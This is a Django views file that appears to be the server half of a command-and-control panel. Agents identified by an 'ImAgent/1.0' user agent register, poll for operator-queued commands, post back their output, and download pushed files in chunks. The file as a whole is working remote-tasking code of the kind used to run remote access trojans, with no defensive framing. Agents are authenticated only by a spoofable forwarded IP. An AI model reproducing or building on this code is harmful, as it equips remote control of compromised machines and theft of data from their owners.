from django.http import HttpResponse
from django.contrib.auth import logout
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
import random
import string
from .models import *
from django.views.generic import View
import re
from .forms import UploadsForm


def name_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    return ip


def create_or_get_user(request):
    clients = Clients.objects.all()
    ip = get_client_ip(request)
    user_agent = request.META.get('HTTP_USER_AGENT')
    print(f"User-Agent: {user_agent}")
    print(f"IP Address: {ip}")

    if 'ImAgent/1.0' in user_agent:
        if not clients.filter(address=ip).exists():
            Clients.objects.create(address=ip, name=name_generator())
            clients = Clients.objects.all()

    agent = clients.filter(address=ip).first()

    if agent:
        agent.last_updated = now()
        agent.save()

    return clients


class IndexView(View):
    def get(self, request):
        clients = create_or_get_user(request)
        form = UploadsForm()
        context = {
            'clients': clients,
            'form': form,
        }
        return render(request, 'server_side/index.html', context)

    def post(self, request):
        clients = create_or_get_user(request)
        if self.request.POST.get('command'):
            client_name = self.request.POST.get('cmd_btn')
            Commands.objects.create(receiver=clients.filter(name=client_name).first(),
                                    command=self.request.POST.get('command'))
        if request.FILES:
            print('file get')
            form = UploadsForm(request.POST, request.FILES)
            agent = clients.filter(name=self.request.POST.get('upload_btn')).first()
            if form.is_valid():
                upload = form.save(commit=False)
                if agent:
                    upload.client = agent
                    upload.save()
            else:
                print(f'file error: {form.errors}')

        return redirect('index')


@method_decorator(csrf_exempt, name='dispatch')
class SendCommand(View):
    def get(self, request):
        clients = create_or_get_user(request)
        ip = get_client_ip(request)
        agent = clients.filter(address=ip).first()

        if not agent:
            return HttpResponse('Agent not found', status=400)

        cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False).first()

        if cmd_execution:

            if not cmd_execution.is_executed:
                cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
                return HttpResponse(cmd)
            else:
                return HttpResponse("Command already executed.", status=200)

        return HttpResponse("No command available.", status=200)

    def post(self, request, *args, **kwargs):
        clients = create_or_get_user(request).order_by('-last_updated')
        body = request.body.decode('utf-8')
        ip = get_client_ip(request)
        agent = clients.filter(address=ip).first()

        if not agent:
            return HttpResponse("No client found for this IP.", status=400)

        match = re.search(r'id\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse("Mistake detected. No ID sent :|", status=400)

        cmd_id = int(match.group(1))
        print(cmd_id)

        cmd = Commands.objects.filter(receiver=agent, id=cmd_id).first()

        if cmd:
            cmd.is_executed = True
            response = re.sub(r'id\s*=\s*(\d+)', '', body).strip()
            print(response)
            cmd.command_response = response
            cmd.save()
            return HttpResponse("Command executed successfully.", status=200)

        return HttpResponse("Command not found.", status=404)


@method_decorator(csrf_exempt, name='dispatch')
class FileDownloadView(View):
    def get(self, request):
        clients = create_or_get_user(request)
        ip = get_client_ip(request)
        agent = clients.filter(address=ip).first()
        if agent:
            file = Uploads.objects.filter(client=agent).first()
            if file:
                response = HttpResponse('you have file')
                response['File-Name'] = file.file.name.replace("uploads/", "")
                return response
            else:
                return HttpResponse('you have not file')
        else:
            return HttpResponse("No client found for this IP.", status=400)

    def post(self, request, *args, **kwargs):
        body = request.body.decode('utf-8')
        if 'send' in body:
            clients = create_or_get_user(request)
            ip = get_client_ip(request)
            agent = clients.filter(address=ip).first()
            chunk_size = 1024 * 1024 * 10  # 10 MB
            match = re.search(r'index=(\d+)', body)

            if match:
                index = int(match.group(1))

                if agent:
                    file = Uploads.objects.filter(client=agent).first()
                else:
                    return HttpResponse("No client found for this IP.", status=400)

                if file:
                    chunk, last = self.chunk_file(file.file.path, index, chunk_size)
                    file_name= file.file.name.replace("uploads/", "")
                    response = HttpResponse(chunk, content_type='application/octet-stream')
                    response['Content-Disposition'] = f'attachment; filename="{file_name}"'

                    if last:
                        response['Last-Chunk'] = str(last)
                        return response
                    return response
                else:
                    return HttpResponse("File not found.", status=404)

    def chunk_file(self, file_path, index, chunk_size):
        try:
            with open(file_path, 'rb') as f:
                f.seek(index * chunk_size)
                chunk = f.read(chunk_size)
                if len(chunk) < chunk_size:
                    return chunk, True
                else:
                    return chunk, False
        except Exception as e:
            print(f'Exception: {e}')


def logout_view(request):
    logout(request)
    return redirect('login')
